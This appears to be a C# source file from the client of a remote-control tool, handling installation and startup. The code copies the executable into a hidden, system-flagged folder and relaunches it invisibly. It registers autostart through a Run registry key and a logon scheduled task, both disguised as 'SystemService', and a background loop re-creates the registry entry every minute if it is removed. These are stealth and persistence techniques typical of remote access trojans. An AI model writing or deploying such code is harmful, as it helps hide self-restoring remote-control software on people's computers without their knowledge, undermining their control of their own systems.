using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client
{
    partial class Program
    {
        static bool EnsureInstalled()
        {
            try
            {
                string currentPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                string installDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "RemoteControlClient");
                string targetName = GetConfiguredClientFileName();
                string installPath = Path.Combine(installDir, targetName);

                if (string.Equals(currentPath, installPath, StringComparison.OrdinalIgnoreCase))
                    return false;

                Directory.CreateDirectory(installDir);
                File.Copy(currentPath, installPath, true);
                DoOutput("Installed to: " + installPath);

                File.SetAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(installDir,
                    new DirectoryInfo(installDir).Attributes | FileAttributes.Hidden);

                Process.Start(new ProcessStartInfo
                {
                    FileName = installPath,
                    Arguments = "/r",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return true;
            }
            catch (Exception ex)
            {
                DoOutput("Install failed: " + ex.Message);
                return false;
            }
        }

        static void EnsureAutoStart()
        {
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string runCmd = "\"" + exePath + "\" /r";

            try
            {
                string regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                {
                    object val = key.GetValue("SystemService");
                    if (val == null || val.ToString() != runCmd)
                    {
                        key.SetValue("SystemService", runCmd, RegistryValueKind.String);
                        DoOutput("Registry autostart updated.");
                    }
                }
            }
            catch (Exception ex)
            {
                DoOutput("Registry autostart failed: " + ex.Message);
            }

            try
            {
                SchTaskUtil.DeleteSchedule("SystemService");
                SchTaskUtil.CreateScheduleOnLogon("SystemService", exePath);
                DoOutput("Scheduled task autostart updated.");
            }
            catch (Exception ex)
            {
                DoOutput("Scheduled task autostart failed: " + ex.Message);
            }
        }

        static void PersistenceGuard()
        {
            while (!isClosing)
            {
                Thread.Sleep(60000);
                try
                {
                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                    string runCmd = "\"" + exePath + "\" /r";
                    string regPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
                    {
                        object val = key.GetValue("SystemService");
                        if (val == null || val.ToString() != runCmd)
                        {
                            key.SetValue("SystemService", runCmd, RegistryValueKind.String);
                        }
                    }
                }
                catch
                {
                }
            }
        }
    }
}
